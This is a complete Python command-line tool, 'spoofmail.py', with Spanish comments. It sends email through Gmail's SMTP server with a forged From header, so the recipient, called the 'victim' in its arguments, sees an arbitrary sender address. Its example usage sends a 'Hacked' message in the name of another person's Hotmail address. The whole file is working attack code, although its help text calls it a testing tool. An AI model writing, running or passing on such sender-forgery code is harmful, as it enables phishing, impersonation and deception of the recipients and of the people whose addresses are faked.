import smtplib
import argparse
import sys
import signal
import time
from pwn import *
from termcolor import colored
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Banner de bienvenida
def print_banner():
    banner = '''
  ███████╗██████╗  ██████╗  ██████╗ ███████╗███╗   ███╗ █████╗ ██╗██╗     
  ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝████╗ ████║██╔══██╗██║██║     
  ███████╗██████╔╝██║   ██║██║   ██║█████╗  ██╔████╔██║███████║██║██║     
  ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ██║╚██╔╝██║██╔══██║██║██║     
  ███████║██║     ╚██████╔╝╚██████╔╝██║     ██║ ╚═╝ ██║██║  ██║██║███████╗
  ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
                                                                                
                                                Creado por Frib1t

    Ejemplo de uso:
        python3 spoofmail.py -c frib1t*****@gmail.com -p "**** **** **** ****" \\
        -v *********@hotmail.com -s Hacked -S ra********@hotmail.com \\
        -t "hola has sido hackeado"
    '''
    print(colored(banner, 'green'))




# Salida del programa
def signal_handler(sig, frame):
    print(colored(f"\n[!] Saliendo del programa...", 'red'))
    sys.exit(1)


signal.signal(signal.SIGINT, signal_handler)


def get_arguments():
    parser = argparse.ArgumentParser(
        description="Herramienta para realizar pruebas de spoofmail.\n\n" +
                    "Ejemplo de uso:\n" +
                    'python3 spoofmail.py -c frib1t*****@gmail.com -p "**** **** **** ****" -v r*********@hotmail.com -s Hacked -S r**********@hotmail.com -t "hola has sido hackeado"',
        formatter_class=argparse.RawTextHelpFormatter)
    
    parser.add_argument("-c", "--count", required=True, dest="sender_email", help="Nombre de la cuenta desde la que enviar el mail")
    parser.add_argument("-p", "--password", required=True, dest="app_password", help="Contraseña de la cuenta emisora")
    parser.add_argument("-v", "--victim", required=True, dest="receiver_email", help="Nombre de la cuenta de la victima")
    parser.add_argument("-s", "--subject", required=True, dest="asunto", help="Asunto del email")    
    parser.add_argument("-S", "--Spoof", required=True, dest="Spoof", help="Nombre que aparecerá como remitente")
    parser.add_argument("-t", "--texto", required=True, dest="texto", help="Texto del mensaje")
    
    return parser.parse_args()





def sendmail(sender_email, app_password, receiver_email, asunto, Spoof, texto):
    p1 = log.progress("Send Mail")
    p1.status("Iniciando el envío del mail")

    time.sleep(2)

    # Crear el mensaje
    message = MIMEMultipart("alternative")
    message["Subject"] = asunto
    message["From"] = f"{Spoof} <{Spoof}>"
    message["To"] = receiver_email

    # Contenido del correo (texto)
    text = texto

    # Añadir el contenido al mensaje
    part = MIMEText(text, "plain")
    message.attach(part)

    try:
        # Conectar al servidor SMTP de Gmail
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(sender_email, app_password)
            server.sendmail(sender_email, receiver_email, message.as_string())

        p1.status("Email enviado")
        print(colored(f"\n[+] Correo enviado con éxito!!!", "yellow"))

    except Exception as e:
        print(colored(f"Error al enviar el correo: {e}", "red"))


def main():
    print_banner()  # Mostrar banner
    args = get_arguments()

    # Enviar correo
    sendmail(args.sender_email, args.app_password, args.receiver_email, args.asunto, args.Spoof, args.texto)


if __name__ == '__main__':
    main()
